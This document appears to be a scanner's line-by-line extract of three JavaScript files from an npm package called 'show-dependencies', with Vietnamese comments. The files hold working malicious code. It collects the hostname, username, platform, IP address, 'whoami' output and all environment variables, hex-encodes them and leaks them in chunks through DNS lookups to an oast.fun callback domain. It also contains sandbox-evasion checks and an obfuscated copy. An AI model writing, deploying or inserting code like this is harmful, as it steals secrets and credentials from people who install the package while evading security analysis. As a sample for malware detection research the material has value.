// File: tmp/tmpurwdlnmv/show-dependencies/package/app.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const dns = require('dns')
Line 3: const https = require('https')
Line 6: {
    // --- Cấu hình ---
    // Thay thế 'xxxxxxxxxxxx.oast.fun' bằng domain của bạn từ Interact.sh hoặc Burp Collaborator
    const attackerDomain = 'ktrlbxgezawrunxutmddwwlbwr26w2elv.oast.fun'; 

    // --- Sandbox Evasion (Kỹ thuật né tránh môi trường ảo hóa) ---
    const forbiddenUsernames = ['sandbox', 'test', 'vmware', 'virtualbox', 'docker'];
    if (forbiddenUsernames.includes(os.userInfo().username.toLowerCase())) {
        return;
    }
    if (os.cpus().length < 2 || os.totalmem() < 2 * 1024 * 1024 * 1024) {
        return;
    }
    
    // --- Lấy địa chỉ IP (ĐOẠN MÃ MỚI) ---
    let ip = 'N/A';
    try {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                // Chỉ lấy địa chỉ IPv4 không phải nội bộ
                if (iface.family === 'IPv4' && !iface.internal) {
                    ip = iface.address;
                    break;
                }
   ...
Line 12: const forbiddenUsernames = ['sandbox', 'test', 'vmware', 'virtualbox', 'docker']
Line 13: forbiddenUsernames.includes(os.userInfo().username.toLowerCase())
Line 16: os.totalmem()
Line 24: for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                // Chỉ lấy địa chỉ IPv4 không phải nội bộ
                if (iface.family === 'IPv4' && !iface.internal) {
                    ip = iface.address;
                    break;
                }
            }
            if (ip !== 'N/A') break;
        }
Line 25: for (const iface of interfaces[name]) {
                // Chỉ lấy địa chỉ IPv4 không phải nội bộ
                if (iface.family === 'IPv4' && !iface.internal) {
                    ip = iface.address;
                    break;
                }
            }
Line 42: os.userInfo()
Line 43: os.hostname()
Line 44: os.platform()
Line 45: os.arch()
Line 52: Buffer.from(dataString).toString('hex')

// File: tmp/tmpurwdlnmv/show-dependencies/package/app.obfuscated.js
// ======================================================================
Line 1: _tmp_0.push("ktrlbxgezawrunxutmddwwlbwr26w2elv.oast.fun")

// File: tmp/tmpurwdlnmv/show-dependencies/package/app_old.js
// ======================================================================
Line 2: const os = require('os')
Line 3: os.totalmem()
Line 5: process.exit(0)
Line 9: _tmp_0 = require('child_process')
Line 10: const dns = require('dns')
Line 12: {
    // a. Thu thập dữ liệu
    let collectedData = '';
    const hostname = os.hostname();
    const username = os.userInfo().username;
    const platform = os.platform();
    const whoami = execSync('whoami').toString().trim();
    const env_vars = JSON.stringify(process.env);

    collectedData = `h=${hostname}&u=${username}&p=${platform}&w=${whoami}&e=${env_vars}`;

    // b. Mã hóa dữ liệu sang Hex và chia nhỏ
    const encodedData = Buffer.from(collectedData).toString('hex');
    const chunks = encodedData.match(/.{1,60}/g) || [];

    // c. Gửi dữ liệu qua các truy vấn DNS
    const attackerDomain = 'ktrlbxgezawrunxutmddv9hytzk7lmcbs.oast.fun'; //!!! THAY THẾ BẰNG SUBDOMAIN ĐÃ CẤU HÌNH CỦA BẠN!!!

    if (chunks.length > 0) {
        chunks.forEach((chunk, index) => {
            // Cấu trúc subdomain: <chỉ_số>.<dữ_liệu_chunk>.<tên_miền_tấn_công>
            const subdomain = `${index}.${chunk}.${attackerDomain}`;
            
            // dns.lookup sẽ kích hoạt một truy ...
Line 15: os.hostname()
Line 16: os.userInfo()
Line 17: os.platform()
Line 18: execSync('whoami').toString().trim()
Line 24: Buffer.from(collectedData).toString('hex')
Line 25: const chunks = encodedData.match(/.{1,60}/g) || []
